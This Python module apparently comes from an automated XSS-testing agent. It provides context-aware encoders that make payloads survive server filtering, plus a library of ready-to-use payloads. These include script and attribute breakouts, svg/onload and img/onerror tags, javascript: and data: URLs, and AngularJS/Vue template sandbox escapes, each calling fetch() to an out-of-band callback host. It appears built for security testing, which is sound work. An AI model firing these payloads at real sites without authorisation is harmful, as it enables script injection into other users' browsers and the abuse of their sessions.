"""
Pure payload encoding and preparation utilities.

These functions handle context-aware encoding of XSS payloads so they
survive server-side transformations and execute in the target context.
All functions are pure — no side effects, no instance state.

Extracted from xss_agent.py to be reusable across agents.
"""
import html as html_module
from typing import Dict, List
from urllib.parse import quote


def encode_for_html_attribute(payload: str) -> str:
    """
    HTML-entity-encode a payload for injection into an HTML attribute context.

    Escapes <, >, &, ", and ' so the payload survives inside attribute values
    like: <input value="PAYLOAD">

    Args:
        payload: Raw payload string.

    Returns:
        HTML-entity-encoded string safe for attribute injection.
    """
    return html_module.escape(payload, quote=True)


def encode_for_js_string(payload: str) -> str:
    """
    Escape a payload for injection inside a JavaScript string literal.

    Handles backslashes, single quotes, and double quotes so the payload
    doesn't break out of a JS string prematurely (or does so intentionally
    when the payload is designed to).

    Args:
        payload: Raw payload string.

    Returns:
        Escaped string suitable for JS string context.
    """
    return payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')


def encode_for_script(payload: str) -> str:
    """
    Escape closing script tags in a payload.

    Prevents the payload from prematurely closing a <script> block by
    replacing </script> with <\\/script>.

    Args:
        payload: Raw payload string.

    Returns:
        Payload with closing script tags escaped.
    """
    return payload.replace("</script>", "<\\/script>")


def prepare_payload(payload: str, context: str) -> str:
    """
    Prepare a payload with appropriate encoding based on the injection context.

    Applies context-specific encoding to ensure the payload survives server-side
    transformations and executes in the target context. Unknown or html_body
    contexts pass the payload through unmodified.

    Context mapping:
        - url_href, url_src  -> URL percent-encoding
        - html_attribute     -> HTML entity encoding
        - javascript_string  -> JS string escaping
        - script             -> Script tag escaping
        - html_body, unknown -> No encoding (pass-through)

    Args:
        payload: Raw payload string.
        context: The injection context type (e.g., "script", "html_attribute").

    Returns:
        Encoded payload string ready for injection.
    """
    if context in ("url_href", "url_src"):
        return quote(payload, safe="")
    if context == "html_attribute":
        return encode_for_html_attribute(payload)
    if context == "javascript_string":
        return encode_for_js_string(payload)
    if context == "script":
        return encode_for_script(payload)
    # html_body or unknown - return as-is
    return payload


def get_context_payload_map() -> Dict[str, List[str]]:
    """
    Return a mapping of injection contexts to payload templates.

    Each payload template contains {{interactsh_url}} placeholders that must
    be replaced with an actual Interactsh URL before use. The payloads are
    grouped by the HTML/JS context they target.

    Returns:
        Dict mapping context names to lists of payload template strings.
    """
    return {
        "script": [
            "';fetch('https://{{interactsh_url}}');//",
            "\";fetch('https://{{interactsh_url}}');//",
            "`;fetch('https://{{interactsh_url}}');//",
            "</script><script>fetch('https://{{interactsh_url}}')</script>",
        ],
        "javascript_string": [
            "'-fetch('https://{{interactsh_url}}')-'",
            "\"-fetch('https://{{interactsh_url}}')-\"",
            "\\');fetch('https://{{interactsh_url}}');//",
        ],
        "html_attribute": [
            "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
            "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
            "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
        ],
        "url_context": [
            "javascript:fetch('https://{{interactsh_url}}')",
            "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
        ],
        "event_handler": [
            "fetch('https://{{interactsh_url}}')",
            "';fetch('https://{{interactsh_url}}');//",
        ],
        "html_body": [
            "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
            "<svg/onload=fetch('https://{{interactsh_url}}')>",
            "<script>fetch('https://{{interactsh_url}}')</script>",
        ],
        # Framework template injection payloads (AngularJS, Vue, etc.)
        "template": [
            "{{constructor.constructor('fetch(\"https://{{interactsh_url}}\")')()}}",
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
            "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}",
            # Vue.js
            "{{_c.constructor('alert(1)')()}}",
        ],
    }


def replace_interactsh_placeholder(
    payloads: List[str], interactsh_url: str
) -> List[str]:
    """
    Replace the {{interactsh_url}} placeholder in all payload strings.

    Args:
        payloads: List of payload template strings containing {{interactsh_url}}.
        interactsh_url: The actual Interactsh callback URL to substitute.

    Returns:
        New list with all placeholders replaced.
    """
    return [p.replace("{{interactsh_url}}", interactsh_url) for p in payloads]
